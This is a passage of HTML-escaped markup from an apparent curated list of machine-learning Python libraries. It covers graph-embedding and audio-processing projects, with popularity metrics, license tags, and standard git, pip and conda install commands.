DeepWalk - Deep Learning for Graphs. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/graph_nets&#34;&gt;graph-nets&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 5.1K · 💀) - Build Graph Nets in Tensorflow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/IBCNServices/pyRDF2Vec&#34;&gt;pyRDF2Vec&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 150) - Python Implementation and Extension of RDF2Vec. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gsi-upm/sematch&#34;&gt;Sematch&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 390 · 💀) - semantic similarity framework for knowledge graph. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepgraph/deepgraph&#34;&gt;DeepGraph&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 250 · 💤) - Analyze Data with Pandas-based Networks. Documentation:. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/shenweichen/GraphEmbedding&#34;&gt;GraphEmbedding&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 2.8K · 💀) - Implementation and experiments of graph embedding.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/thunlp/OpenKE&#34;&gt;OpenKE&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 3K · 💀) - An Open-Source Package for Knowledge Embedding (KE). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alibaba/euler&#34;&gt;Euler&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 2.8K · 💀) - A distributed graph deep learning framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/williamleif/GraphSAGE&#34;&gt;GraphSAGE&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 2.7K · 💀) - Representation learning on large graphs using stochastic.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/thunlp/OpenNE&#34;&gt;OpenNE&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 1.6K · 💀) - An Open-Source Package for Network Embedding (NE). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DeepGraphLearning/graphvite&#34;&gt;GraphVite&lt;/a&gt;&lt;/b&gt; (🥉12 · ⭐ 1K · 💀) - GraphVite: A General and High-performance Graph Embedding System. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Audio Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for audio analysis, manipulation, transformation, and extraction, as well as speech recognition and music generation tasks.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/espnet/espnet&#34;&gt;espnet&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 5.1K) - End-to-End Speech Processing Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/espnet/espnet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 270 · 🔀 1.6K · 📥 76 · 📦 50 · 📋 1.8K - 17% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/espnet/espnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/espnet&#34;&gt;PyPi&lt;/a&gt; (📥 8.1K / month · 📦 1 · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install espnet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mozilla/DeepSpeech&#34;&gt;DeepSpeech&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 20K) - DeepSpeech is an open source embedded (offline, on-device).. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mozilla/DeepSpeech&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 160 · 🔀 3.5K · 📥 840K · 📦 750 · 📋 2.1K - 5% open · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mozilla/DeepSpeech&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepspeech&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 37 · ⏱️ 19.12.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepspeech&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/deepspeech&#34;&gt;Conda&lt;/a&gt; (📥 520 · ⏱️ 29.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge deepspeech&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/audio&#34;&gt;torchaudio&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 1.7K) - Data manipulation and transformation for audio signal.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/audio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 160 · 🔀 420 · 📋 640 - 27% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/audio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchaudio&#34;&gt;PyPi&lt;/a&gt; (📥 510K / month · 📦 140 · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchaudio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/magenta/magenta&#34;&gt;Magenta&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 18K) - Magenta: Music and Art Generation with Machine Intelligence. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/magenta/magenta&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 3.6K · 📦 360 · 📋 920 - 37% open · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/magenta/magenta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/magenta&#34;&gt;PyPi&lt;/a&gt; (📥 4.7K / month · 📦 36 · ⏱️ 12.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install magenta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/librosa/librosa&#34;&gt;librosa&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 5.2K) - Python library for audio and music analysis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3hkKRql&#34;&gt;ISC&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/librosa/librosa&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 96 · 🔀 800 · 📋 970 - 4% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/librosa/librosa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/librosa&#34;&gt;PyPi&lt;/a&gt; (📥 950K / month · 📦 1.2K · ⏱️ 15.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install librosa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/librosa&#34;&gt;Conda&lt;/a&gt; (📥 460K · ⏱️ 15.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge librosa&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/speechbrain/speechbrain&#34;&gt;speechbrain&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 4.1K) - A PyTorch-based Speech Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/speechbrain/speechbrain&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 160 · 🔀 760 · 📦 180 · 📋 670 - 21% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/speechbrain/speechbrain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/speechbrain&#34;&gt;PyPi&lt;/a&gt; (📥 9.4K / month · 📦 2 · ⏱️ 20.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install speechbrain&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Uberi/speech_recognition&#34;&gt;SpeechRecognition&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 6.3K) - Speech recognition module for Python, supporting several.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Uberi/speech_recognition&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 45 · 🔀 2K · 📋 520 - 45% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Uberi/speech_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/SpeechRecognition&#34;&gt;PyPi&lt;/a&gt; (📥 270K / month · 📦 700 · ⏱️ 05.12.2017):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install SpeechRecognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/speechrecognition&#34;&gt;Conda&lt;/a&gt; (📥 140K · ⏱️ 13.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge speechrecognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jiaaro/pydub&#34;&gt;Pydub&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 6.1K) - Manipulate audio with a simple and easy high level interface. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jiaaro/pydub&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 92 · 🔀 810 · 📦 12K · 📋 480 - 45% open · ⏱️ 14.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jiaaro/pydub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pydub&#34;&gt;PyPi&lt;/a&gt; (📥 1.9M / month · 📦 900 · ⏱️ 10.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pydub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pydub&#34;&gt;Conda&lt;/a&gt; (📥 23K · ⏱️ 13.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pydub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tyiannak/pyAudioAnalysis&#34;&gt;pyAudioAnalysis&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 4.8K) - Python Audio Analysis Library: Feature Extraction,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tyiannak/pyAudioAnalysis&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 26 · 🔀 1.1K · 📦 270 · 📋 290 - 59% open · ⏱️ 19.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tyiannak/pyAudioAnalysis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyAudioAnalysis&#34;&gt;PyPi&lt;/a&gt; (📥 27K / month · 📦 19 · ⏱️ 07.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyAudioAnalysis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/coqui-ai/TTS&#34;&gt;Coqui TTS&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 4.9K) - - a deep learning toolkit for Text-to-Speech, battle-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/coqui-ai/TTS&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 88 · 🔀 500 · 📥 160K · 📋 330 - 8% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/coqui-ai/TTS&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tts&#34;&gt;PyPi&lt;/a&gt; (📥 6K / month · ⏱️ 14.07.2017):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tts&#34;&gt;Conda&lt;/a&gt; (📥 1.7K · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Picovoice/porcupine&#34;&gt;Porcupine&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.7K) - On-device wake word detection powered by deep learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Picovoice/porcupine&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 31 · 🔀 390 · 📦 9 · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Picovoice/Porcupine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pvporcupine&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · 📦 11 · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pvporcupine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/devsnd/tinytag&#34;&gt;tinytag&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 530) - Read audio and music meta data and duration of MP3, OGG, OPUS, MP4, M4A,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/devsnd/tinytag&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 89 · 📦 520 · 📋 90 - 12% open · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/devsnd/tinytag&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tinytag&#34;&gt;PyPi&lt;/a&gt; (📥 94K / month · 📦 70 · ⏱️ 12.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tinytag&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/beetbox/audioread&#34;&gt;audioread&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 400) - cross-library (GStreamer + Core Audio + MAD + FFmpeg) audio decoding.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/beetbox/audioread&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 93 · 📦 8.5K · 📋 79 - 39% open · ⏱️ 03.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/beetbox/audioread&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/audioread&#34;&gt;PyPi&lt;/a&gt; (📥 920K / month · 📦 320 · ⏱️ 20.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install audioread&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/audioread&#34;&gt;Conda&lt;/a&gt; (📥 430K · ⏱️ 10.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge audioread&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deezer/spleeter&#34;&gt;spleeter&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 20K) - Deezer source separation library including pretrained models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deezer/spleeter&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 2.2K · 📥 1.7M · 📋 680 - 20% open · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deezer/spleeter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/spleeter&#34;&gt;PyPi&lt;/a&gt; (📥 13K / month · 📦 5 · ⏱️ 03.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install spleeter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/spleeter&#34;&gt;Conda&lt;/a&gt; (📥 64K · ⏱️ 30.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge spleeter&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/magenta/ddsp&#34;&gt;DDSP&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 2.2K) - DDSP: Differentiable Digital Signal Processing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/magenta/ddsp&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 31 · 🔀 250 · 📦 26 · 📋 140 - 17% open · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/magenta/ddsp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ddsp&#34;&gt;PyPi&lt;/a&gt; (📥 2.8K / month · 📦 1 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ddsp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ddsp&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 08.06.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ddsp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/iver56/audiomentations&#34;&gt;audiomentations&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 980) - A Python library for audio data augmentation. Inspired by.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/iver56/audiomentations&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 21 · 🔀 120 